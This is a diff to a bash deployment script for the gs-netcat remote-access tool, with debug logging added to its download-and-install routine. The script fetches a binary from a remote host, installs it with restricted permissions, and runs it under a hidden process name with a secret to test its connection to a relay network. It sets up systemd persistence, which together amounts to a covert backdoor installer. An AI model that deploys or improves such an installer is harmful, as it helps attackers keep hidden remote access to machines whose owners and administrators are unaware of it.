@@ -1267,14 +1267,6 @@ test_network()
 	local ret
 	unset IS_TESTNETWORK_OK
 
-	# There should be no GS-NETCAT listening.
-	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-netcat try the connection.
-	# 1. Exit=0 immediatly if server exists.
-	# 2. Exit=202 after n seconds. Firewalled/DNS?
-	# 3. Exit=203 if TCP to GSRN is refused.
-	# 3. Exit=61 on GS-Connection refused. (server does not exist)
-	# Do not need GS_ENV[*] here because all env variables are exported
-	# when exec is used.
 	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
@@ -1311,10 +1303,6 @@ test_network()
 
 	# Fail _unless_ it's ECONNREFUSED
 	[[ $ret -eq 61 ]] && {
-		# HERE: ECONNREFUSED
-		# Connection to GSRN was successfull and GSRN reports
-		# that no server is listening.
-		# This is a good enough test that this network & binary is working.
 		IS_TESTNETWORK_OK=1
 		return
 	}
@@ -1386,19 +1374,50 @@ try()
 	local src_pkg="$2"
 
 	[[ -z "$src_pkg" ]] && src_pkg="gs-netcat_${osarch}.tar.gz"
-	echo -e "--> Trying ${CG}${osarch}${CN}"
+
+	# Simpan log debugging ke file
+	LOGFILE="debug_try.log"
+	exec 2> "$LOGFILE"
+
+	echo "=====[ DEBUG: Running try() ]=====" | tee -a "$LOGFILE"
+	echo "OS Architecture: $osarch" | tee -a "$LOGFILE"
+	echo "Source Package: $src_pkg" | tee -a "$LOGFILE"
+	echo "Temporary Directory: $TMPDIR" | tee -a "$LOGFILE"
+	echo "Destination Binary Path: $DSTBIN" | tee -a "$LOGFILE"
+
 	# Download binaries
-	echo -en "Downloading binaries.................................................."
+	echo -e "--> Trying ${CG}${osarch}${CN}"
+	echo -en "Downloading binaries.................................................." | tee -a "$LOGFILE"
+	
 	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
+	if [[ $? -ne 0 ]]; then
+		echo "ERROR: Failed to download binaries from ${URL_BIN}/${src_pkg}" | tee -a "$LOGFILE"
+		FAIL_OUT
+		exit 1
+	fi
 	OK_OUT
 
-	echo -en "Unpacking binaries...................................................."
+	# Unpacking binaries
+	echo -en "Unpacking binaries...................................................." | tee -a "$LOGFILE"
 	if [[ "${src_pkg}" == *.tar.gz ]]; then
-		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
-		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
-		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
+		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null)
+		if [[ $? -ne 0 ]]; then
+			echo "ERROR: Failed to unpack binaries" | tee -a "$LOGFILE"
+			FAIL_OUT "Unpacking failed"
+			exit 1
+		fi
+
+		# Debug: Cek apakah file hasil ekstraksi ada
+		ls -l "${TMPDIR}" | tee -a "$LOGFILE"
+
+		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat"
+
 		[[ -n $GS_USELOCAL_GSNC ]] && {
-			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
+			[[ -f "$GS_USELOCAL_GSNC" ]] || { 
+				echo "ERROR: Local GSNC not found: ${GS_USELOCAL_GSNC}" | tee -a "$LOGFILE"
+				FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"
+				exit 1
+			}
 			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
 		}
 	else
@@ -1406,20 +1425,29 @@ try()
 	fi
 	OK_OUT
 
-	echo -en "Copying binaries......................................................"
-	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+	# Copying binaries
+	echo -en "Copying binaries......................................................" | tee -a "$LOGFILE"
+	xmv "${TMPDIR}/gs-netcat" "$DSTBIN"
+	if [[ $? -ne 0 ]]; then
+		echo "ERROR: Failed to copy binaries to $DSTBIN" | tee -a "$LOGFILE"
+		FAIL_OUT
+		exit 1
+	fi
 	chmod 700 "$DSTBIN"
 	OK_OUT
 
-	echo -en "Testing binaries......................................................"
+	# Testing binaries
+	echo -en "Testing binaries......................................................" | tee -a "$LOGFILE"
 	test_bin "${DSTBIN}"
-	if [[ -n "$IS_TESTBIN_OK" ]]; then
+	if [[ $? -eq 0 ]]; then
 		OK_OUT
-		return
+	else
+		echo "ERROR: Binary test failed for $DSTBIN" | tee -a "$LOGFILE"
+		rm -f "${TMPDIR}/${src_pkg:?}"
+		exit 1
 	fi
-
-	rm -f "${TMPDIR}/${src_pkg:?}"
 }
+
 
 gs_start_systemd()
 {
